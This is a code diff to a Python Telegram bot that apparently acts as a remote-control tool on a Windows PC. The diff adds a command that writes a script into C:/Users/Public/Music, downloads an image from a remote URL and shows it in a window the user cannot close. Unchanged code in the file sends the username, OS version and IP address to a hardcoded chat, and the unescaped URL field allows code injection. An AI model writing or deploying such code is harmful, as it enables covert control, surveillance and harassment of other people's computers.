@@ -1,5 +1,8 @@
 chat_user_id = 496266339
 ######################
+#2.2 08.11.2021
+#i+url - open image and user can not close it
+#close - close image
 #2
 #
 #1.99.3 0.3/11/2021 04:00
@@ -124,7 +127,11 @@ def message_handler(update: Update, context: CallbackContext):
 		bot.send_message(chat_id=chat_user_id, text='start updating')
 		leave()
 		exit()
-		
+	elif text[0] == 'i':
+		text=text[1:]
+		open_image(text)	
+	elif text == 'close':
+		keyboard.send('`')
 	elif text == '_status':  
 		print('ok')    
 		cpu = psutil.cpu_times_percent(interval=0.4, percpu=False)
@@ -136,7 +143,29 @@ def message_handler(update: Update, context: CallbackContext):
 		
 		status='Пользователь: '+USER_NAME+' Версия os '+str(subprocess.check_output('ver', shell=True))+' всего RAM: '+str(mem_total)+' использовано: '+str(mem_use)+'ip адрес, udp port '+str(conn.getresponse().read())
 		bot.send_message(chat_id=chat_user_id, text=str(status) )
-        
+def open_image(text):
+	num = 96
+	bat_path = r'C:/Users/Public/Music/image.pyw'
+	with open(bat_path, "w+") as bat_file:
+			bat_file.write('\nimport cv2'
+'\nimport cv2'
+'\nimport numpy as np'
+'\nimport requests'
+'\nurl = r"'+str(text)+'"'
+'\nresp = requests.get(url, stream=True).raw'
+'\nimage = np.asarray(bytearray(resp.read()), dtype="uint8")'
+'\nimage = cv2.imdecode(image, cv2.IMREAD_COLOR)'
+'\nwhile 1:'
+'\n    cv2.imshow("its end...",image)'
+'\n    if cv2.waitKey(0) =='+ str(num)+ ':'
+'\n        break'
+'\ncv2.destroyAllWindows()')
+	os.system('python "C:/Users/Public/Music/image.pyw" && exit')
+		
+		
+		
+		
+		
 def system_command(text):
 	text = text[1:]
 	#os.system(text)
